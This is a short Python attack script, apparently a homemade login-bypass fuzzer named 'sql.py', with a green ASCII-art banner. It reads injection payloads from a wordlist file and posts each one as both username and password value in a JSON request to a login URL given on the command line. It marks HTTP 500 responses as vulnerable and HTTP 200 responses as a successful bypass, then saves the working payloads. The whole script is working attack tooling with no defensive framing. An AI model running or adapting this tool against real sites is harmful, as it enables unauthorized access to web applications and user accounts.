#!/usr/bin/python

import requests
import json
import time
import sys
import os

TGREEN =  '\033[32m'
print(TGREEN + '          _____                            _____          ')
print(TGREEN + '         /\    \                          /\    \         ')
print(TGREEN + '        /::\    \                        /::\____\        ')
print(TGREEN + '       /::::\    \                      /:::/    /        ')
print(TGREEN + '      /::::::\    \                    /:::/    /         ')
print(TGREEN + '     /:::/\:::\    \                  /:::/    /          ')
print(TGREEN + '    /:::/  \:::\    \                /:::/____/           ')
print(TGREEN + '   /:::/    \:::\    \              /::::\    \           ')
print(TGREEN + '  /:::/    / \:::\    \            /::::::\    \   _____  ')
print(TGREEN + ' /:::/    /   \:::\    \          /:::/\:::\    \ /\    \ ')
print(TGREEN + '/:::/____/     \:::\____\        /:::/  \:::\    /::\____\ ')
print(TGREEN + '\:::\    \      \::/    /        \::/    \:::\  /:::/    /')
print(TGREEN + ' \:::\    \      \/____/          \/____/ \:::\/:::/    / ')
print(TGREEN + '  \:::\    \                               \::::::/    /  ')
print(TGREEN + '   \:::\    \                               \::::/    /   ')
print(TGREEN + '    \:::\    \                              /:::/    /    ')
print(TGREEN + '     \:::\    \                            /:::/    /     ')
print(TGREEN + '      \:::\    \                          /:::/    /      ')
print(TGREEN + '       \:::\____\                        /:::/    /       ')
print(TGREEN + '        \::/    /                        \::/    /        ')
print(TGREEN + '         \/____/                          \/____/         ')
print('                                                                   ')

time.sleep(3)

########### this script just use for json sites ##############
username =  sys.argv[1] #should be the name in fourm
password =  sys.argv[2] #should be the name in founm
url = sys.argv[3] #should be the login url check with burp first

os.system("touch res.txt")
user_agent = 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0'
headers = {"User-Agent":user_agent}
file = open('auth.txt', 'r')
f = open('res.txt', 'w')

def json():
	print("[+]json mode for  json sites[+]")
	print("===============================")
	print(" example: python sql.py j user password http://127.0.0.1/login/users")
	print('========================================')
	time.sleep(2)
	for tr in file:
		tr = tr.strip()

		r = requests.post(url, headers=headers, allow_redirects=True, json={username:tr, password:tr})
		if r.status_code == 500:
			print("****************")
			print("vulnderble with  : " + tr)
			print(r.status_code)
			print("****************")
			print("")
			pass
		if r.status_code == 200:
			print('###################')
			print("[+]did bypass with  : " + tr)
			print(r.status_code)
			print('##################')
			f.write(tr)
			f.write('\n')
			pass

	print('')
	print("[!]end of wordlist...")
json()

